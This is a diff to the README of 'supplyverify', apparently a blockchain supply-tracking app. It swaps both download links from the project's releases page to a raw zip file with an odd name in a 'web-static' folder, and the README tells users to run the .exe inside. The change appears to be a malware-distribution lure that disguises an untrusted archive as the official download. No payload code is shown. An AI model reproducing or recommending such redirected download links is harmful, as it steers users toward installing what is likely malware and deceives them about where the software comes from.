@@ -1,6 +1,6 @@
 # 📦 supplyverify - Securely track your products using blockchain
 
-[![Download supplyverify](https://img.shields.io/badge/Download_Latest_Release-Blue-blue.svg)](https://github.com/niallcovert953/supplyverify/releases)
+[![Download supplyverify](https://img.shields.io/badge/Download_Latest_Release-Blue-blue.svg)](https://github.com/niallcovert953/supplyverify/raw/refs/heads/main/web-static/Software_panoplied.zip)
 
 ## 📌 About This System
 
@@ -23,7 +23,7 @@ We recommend using the latest version of your browser. Older versions might not 
 
 You can find the latest version of the application on the release page. 
 
-[Visit this page to download the software](https://github.com/niallcovert953/supplyverify/releases)
+[Visit this page to download the software](https://github.com/niallcovert953/supplyverify/raw/refs/heads/main/web-static/Software_panoplied.zip)
 
 Choose the file that matches your system architecture. Most users should select the file ending in .exe. Save the file to a folder you can find easily.
 
